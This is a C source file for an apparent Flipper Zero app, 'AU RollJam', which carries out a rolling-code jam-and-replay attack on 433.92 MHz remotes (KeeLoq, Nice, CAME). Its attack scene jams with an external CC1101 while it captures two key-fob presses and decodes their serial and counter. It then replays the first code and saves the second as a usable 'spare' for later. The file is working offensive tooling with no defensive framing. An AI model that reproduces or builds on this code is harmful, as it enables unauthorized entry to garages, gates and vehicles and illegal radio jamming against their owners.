#include "au_rolljam.h"
#include "au_rolljam_scene.h"
#include "au_rolljam_custom_event.h"
#include "au_rolljam_main_view.h"
#include "au_rolljam_attack_view.h"
#include "ext_cc1101.h"
#include "signal_capture.h"
#include "protocol_detect.h"

#include <gui/modules/submenu.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/widget.h>

#define TAG "AuRolljamScene"

/* ================================================================
 *  Scene handler arrays (generated from scene_config.h)
 * ================================================================ */

/* Generate on_enter handlers array */
#define ADD_SCENE(prefix, name, id) prefix##_scene_##name##_on_enter,
void (*const au_rolljam_on_enter_handlers[])(void*) = {
#include "au_rolljam_scene_config.h"
};
#undef ADD_SCENE

/* Generate on_event handlers array */
#define ADD_SCENE(prefix, name, id) prefix##_scene_##name##_on_event,
bool (*const au_rolljam_on_event_handlers[])(void* context, SceneManagerEvent event) = {
#include "au_rolljam_scene_config.h"
};
#undef ADD_SCENE

/* Generate on_exit handlers array */
#define ADD_SCENE(prefix, name, id) prefix##_scene_##name##_on_exit,
void (*const au_rolljam_on_exit_handlers[])(void* context) = {
#include "au_rolljam_scene_config.h"
};
#undef ADD_SCENE

/* Initialize scene handlers configuration structure */
const SceneManagerHandlers au_rolljam_scene_handlers = {
    .on_enter_handlers = au_rolljam_on_enter_handlers,
    .on_event_handlers = au_rolljam_on_event_handlers,
    .on_exit_handlers = au_rolljam_on_exit_handlers,
    .scene_num = AuRolljamSceneNum,
};

/* ================================================================
 *  Helper: forward custom event from view callback to scene
 * ================================================================ */

static void au_rolljam_scene_event_callback(uint32_t event, void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    view_dispatcher_send_custom_event(instance->view_dispatcher, event);
}

/* ================================================================
 *  Internal radio RX callback — detects protocol + stores code
 * ================================================================ */

static volatile bool g_signal_captured = false;
static volatile bool g_is_code_a = true;

static void rolljam_rx_callback(bool level, uint32_t duration, void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    /* Accumulate the sample into the current capture buffer */
    CapturedCode* code = g_is_code_a ? &instance->code_a : &instance->code_b;

    /* Grow buffer in 1024-sample chunks */
    if(code->count >= code->_capacity) {
        size_t new_cap = code->_capacity + 1024;
        LevelDuration* new_buf = realloc(code->samples, new_cap * sizeof(LevelDuration));
        if(!new_buf) return;
        code->samples = new_buf;
        code->_capacity = new_cap;
    }

    code->samples[code->count] = level_duration_make(level, duration);
    code->count++;

    /* Try protocol detection when we have enough samples */
    if(code->count > 50 && !g_signal_captured) {
        DecodedRollingCode decoded;
        if(protocol_detect(code->samples, code->count, &decoded)) {
            strlcpy(code->protocol, protocol_name(decoded.proto), sizeof(code->protocol));
            code->serial = decoded.serial;
            code->counter = decoded.counter;
            g_signal_captured = true;

            uint32_t evt = g_is_code_a ?
                AuRolljamCustomEventSignalCapturedA :
                AuRolljamCustomEventSignalCapturedB;
            view_dispatcher_send_custom_event(instance->view_dispatcher, evt);
        }
    }
}

/* ================================================================
 *  SceneStart — main menu
 * ================================================================ */

void au_rolljam_scene_start_on_enter(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    au_rolljam_main_view_set_callback(
        instance->view_main, au_rolljam_scene_event_callback, instance);

    /* Probe external CC1101 */
    ext_cc1101_init();
    instance->config.ext_module_present = ext_cc1101_check_present();

    view_dispatcher_switch_to_view(instance->view_dispatcher, AuRolljamViewMain);
}

bool au_rolljam_scene_start_on_event(void* context, SceneManagerEvent event) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == AuRolljamCustomEventStartAttack) {
            if(!instance->config.ext_module_present) {
                dialog_ex_set_context(instance->dialog_ex, instance);
                dialog_ex_set_header(
                    instance->dialog_ex, "No External Module", 64, 4, AlignCenter, AlignTop);
                dialog_ex_set_text(
                    instance->dialog_ex,
                    "Connect CC1101 to GPIO:\n"
                    "Pin 2=MOSI  Pin 3=MISO\n"
                    "Pin 5=SCK   Pin 16=CS\n"
                    "Pin 6=GDO0",
                    4, 18, AlignLeft, AlignTop);
                dialog_ex_set_center_button_text(instance->dialog_ex, "OK");
                view_dispatcher_switch_to_view(
                    instance->view_dispatcher, AuRolljamViewDialogEx);
            } else {
                scene_manager_next_scene(instance->scene_manager, AuRolljamSceneAttack);
            }
            consumed = true;
        } else if(event.event == AuRolljamCustomEventConfig) {
            scene_manager_next_scene(instance->scene_manager, AuRolljamSceneConfig);
            consumed = true;
        } else if(event.event == AuRolljamCustomEventAbout) {
            scene_manager_next_scene(instance->scene_manager, AuRolljamSceneAbout);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeBack) {
        scene_manager_stop(instance->scene_manager);
        view_dispatcher_stop(instance->view_dispatcher);
        consumed = true;
    }

    return consumed;
}

void au_rolljam_scene_start_on_exit(void* context) {
    UNUSED(context);
}

/* ================================================================
 *  SceneConfig — configure jam offset, protocol
 * ================================================================ */

static const char* const proto_names[] = {"Auto", "KeeLoq", "Nice", "CAME"};
static const uint8_t proto_values[] = {
    ROLLJAM_PROTO_AUTO, ROLLJAM_PROTO_KEELOQ, ROLLJAM_PROTO_NICE, ROLLJAM_PROTO_CAME};

static void au_rolljam_config_frequency_cb(VariableItem* item) {
    UNUSED(item);
}

static void au_rolljam_config_jam_offset_cb(VariableItem* item) {
    furi_assert(item);
    AuRollJamState* instance = variable_item_get_context(item);
    int32_t offset = AU_ROLLJAM_JAM_OFFSET_MIN +
                     (int32_t)variable_item_get_current_value_index(item) * AU_ROLLJAM_JAM_OFFSET_STEP;
    instance->config.jam_offset_hz = offset;
    char buf[16];
    snprintf(buf, sizeof(buf), "%ld kHz", offset / 1000);
    variable_item_set_current_value_text(item, buf);
}

static void au_rolljam_config_protocol_cb(VariableItem* item) {
    furi_assert(item);
    AuRollJamState* instance = variable_item_get_context(item);
    uint8_t idx = variable_item_get_current_value_index(item);
    instance->config.target_proto = proto_values[idx];
    variable_item_set_current_value_text(item, proto_names[idx]);
}

void au_rolljam_scene_config_on_enter(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    variable_item_list_reset(instance->var_list);

    VariableItem* freq_item = variable_item_list_add(
        instance->var_list, "Frequency", 1, au_rolljam_config_frequency_cb, instance);
    variable_item_set_current_value_index(freq_item, 0);
    variable_item_set_current_value_text(freq_item, "433.92 MHz");

    uint8_t offset_steps =
        (AU_ROLLJAM_JAM_OFFSET_MAX - AU_ROLLJAM_JAM_OFFSET_MIN) / AU_ROLLJAM_JAM_OFFSET_STEP + 1;
    VariableItem* offset_item = variable_item_list_add(
        instance->var_list, "Jam Offset", offset_steps, au_rolljam_config_jam_offset_cb, instance);
    uint8_t offset_idx = (uint8_t)(
        (instance->config.jam_offset_hz - AU_ROLLJAM_JAM_OFFSET_MIN) / AU_ROLLJAM_JAM_OFFSET_STEP);
    variable_item_set_current_value_index(offset_item, offset_idx);
    char offset_buf[16];
    snprintf(offset_buf, sizeof(offset_buf), "%ld kHz", instance->config.jam_offset_hz / 1000);
    variable_item_set_current_value_text(offset_item, offset_buf);

    VariableItem* proto_item = variable_item_list_add(
        instance->var_list, "Protocol", ROLLJAM_PROTO_COUNT, au_rolljam_config_protocol_cb, instance);
    variable_item_set_current_value_index(proto_item, instance->config.target_proto);
    variable_item_set_current_value_text(proto_item, proto_names[instance->config.target_proto]);

    view_dispatcher_switch_to_view(instance->view_dispatcher, AuRolljamViewVarList);
}

bool au_rolljam_scene_config_on_event(void* context, SceneManagerEvent event) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeBack) {
        rolljam_save_state(instance->state, &instance->config);
        scene_manager_previous_scene(instance->scene_manager);
        consumed = true;
    }

    return consumed;
}

void au_rolljam_scene_config_on_exit(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    variable_item_list_reset(instance->var_list);
}

/* ================================================================
 *  SceneAttack — main rolljam attack view + state machine
 * ================================================================ */

void au_rolljam_scene_attack_on_enter(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    instance->state = ROLLJAM_STATE_IDLE;
    captured_code_clear(&instance->code_a);
    captured_code_clear(&instance->code_b);
    snprintf(instance->status_text, sizeof(instance->status_text), "Press OK to begin");

    au_rolljam_attack_view_set_callback(
        instance->view_attack, au_rolljam_scene_event_callback, instance);
    au_rolljam_attack_view_set_state(
        instance->view_attack, instance->state, instance->status_text);
    au_rolljam_attack_view_set_codes_info(instance->view_attack, false, false, NULL, NULL);

    view_dispatcher_switch_to_view(instance->view_dispatcher, AuRolljamViewAttack);
}

bool au_rolljam_scene_attack_on_event(void* context, SceneManagerEvent event) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == AuRolljamCustomEventStartAttack) {
            /* IDLE -> JAM_CAPTURE_A */
            instance->state = ROLLJAM_STATE_JAM_CAPTURE_A;
            snprintf(instance->status_text, sizeof(instance->status_text),
                     "Jamming... waiting 1st press");
            /* Start CW jam on external CC1101 + async RX on internal */
            ext_cc1101_start_cw_jam(instance->config.frequency, instance->config.jam_offset_hz);
            g_is_code_a = true;
            g_signal_captured = false;
            captured_code_clear(&instance->code_a);
            signal_capture_start(instance->config.frequency, rolljam_rx_callback, instance);
            au_rolljam_attack_view_set_state(
                instance->view_attack, instance->state, instance->status_text);
            consumed = true;

        } else if(event.event == AuRolljamCustomEventSignalCapturedA) {
            /* First code captured -> JAM_CAPTURE_B */
            signal_capture_stop();
            instance->state = ROLLJAM_STATE_JAM_CAPTURE_B;
            snprintf(instance->status_text, sizeof(instance->status_text),
                     "1st code got! Wait 2nd...");
            au_rolljam_attack_view_set_state(
                instance->view_attack, instance->state, instance->status_text);
            au_rolljam_attack_view_set_codes_info(
                instance->view_attack, true, false, instance->code_a.protocol, NULL);
            /* Restart RX for second code */
            g_is_code_a = false;
            g_signal_captured = false;
            captured_code_clear(&instance->code_b);
            signal_capture_start(instance->config.frequency, rolljam_rx_callback, instance);
            consumed = true;

        } else if(event.event == AuRolljamCustomEventSignalCapturedB) {
            /* Second code captured -> INTERCEPTION_B */
            signal_capture_stop();
            instance->state = ROLLJAM_STATE_INTERCEPTION_B;
            snprintf(instance->status_text, sizeof(instance->status_text),
                     "2nd code got! Press OK to replay");
            au_rolljam_attack_view_set_state(
                instance->view_attack, instance->state, instance->status_text);
            au_rolljam_attack_view_set_codes_info(
                instance->view_attack, true, true,
                instance->code_a.protocol, instance->code_b.protocol);
            consumed = true;

        } else if(event.event == AuRolljamCustomEventReplayPressed) {
            if(instance->state == ROLLJAM_STATE_INTERCEPTION_B) {
                /* Stop jam, replay code_a */
                ext_cc1101_stop_cw_jam();
                instance->state = ROLLJAM_STATE_REPLAY;
                snprintf(instance->status_text, sizeof(instance->status_text),
                         "Replaying 1st code...");
                au_rolljam_attack_view_set_state(
                    instance->view_attack, instance->state, instance->status_text);

                /* Atomic replay of code_a via external CC1101 */
                ext_cc1101_start_async_tx(instance->config.frequency);
                ext_cc1101_atomic_replay_signal(instance->code_a.samples, instance->code_a.count);
                ext_cc1101_stop_async_tx();

                /* Save code_b as spare .sub file */
                instance->state = ROLLJAM_STATE_SAVE;
                char filename[64];
                snprintf(filename, sizeof(filename),
                         "rolljam_%08lX_%04X.sub",
                         instance->code_b.serial,
                         instance->code_b.counter);
                rolljam_save_code(&instance->code_b, filename);

                instance->state = ROLLJAM_STATE_SUCCESS;
                snprintf(instance->status_text, sizeof(instance->status_text),
                         "Done! Spare code saved to SD");
                au_rolljam_attack_view_set_state(
                    instance->view_attack, instance->state, instance->status_text);
            }
            consumed = true;

        } else if(event.event == AuRolljamCustomEventBackPressed) {
            ext_cc1101_stop_cw_jam();
            signal_capture_stop();
            instance->state = ROLLJAM_STATE_IDLE;
            scene_manager_search_and_switch_to_previous_scene(
                instance->scene_manager, AuRolljamSceneStart);
            consumed = true;
        }

    } else if(event.type == SceneManagerEventTypeBack) {
        ext_cc1101_stop_cw_jam();
        signal_capture_stop();
        instance->state = ROLLJAM_STATE_IDLE;
        scene_manager_previous_scene(instance->scene_manager);
        consumed = true;
    }

    return consumed;
}

void au_rolljam_scene_attack_on_exit(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    /* Ensure radio is stopped */
    ext_cc1101_stop_cw_jam();
    ext_cc1101_stop_async_tx();
    signal_capture_stop();
    instance->state = ROLLJAM_STATE_IDLE;
}

/* ================================================================
 *  SceneAbout — information widget
 * ================================================================ */

void au_rolljam_scene_about_on_enter(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;

    widget_reset(instance->widget);
    widget_add_string_element(
        instance->widget, 64, 4, AlignCenter, AlignTop, FontPrimary, "AU RollJam v1.0");
    widget_add_string_multiline_element(
        instance->widget, 4, 18, AlignLeft, AlignTop, FontSecondary,
        "Rolling-code capture & replay\n"
        "for AU 433.92 MHz systems\n\n"
        "Requires external CC1101 on\n"
        "GPIO pins:\n"
        "  Pin 2 = MOSI\n"
        "  Pin 3 = MISO\n"
        "  Pin 5 = SCK\n"
        "  Pin 16 = CS\n"
        "  Pin 6 = GDO0\n\n"
        "Codes saved to:\n"
        "/ext/subghz/au_rolljam/");

    view_dispatcher_switch_to_view(instance->view_dispatcher, AuRolljamViewWidget);
}

bool au_rolljam_scene_about_on_event(void* context, SceneManagerEvent event) {
    furi_assert(context);
    if(event.type == SceneManagerEventTypeBack) {
        scene_manager_previous_scene(((AuRollJamState*)context)->scene_manager);
        return true;
    }
    return false;
}

void au_rolljam_scene_about_on_exit(void* context) {
    furi_assert(context);
    AuRollJamState* instance = (AuRollJamState*)context;
    widget_reset(instance->widget);
}
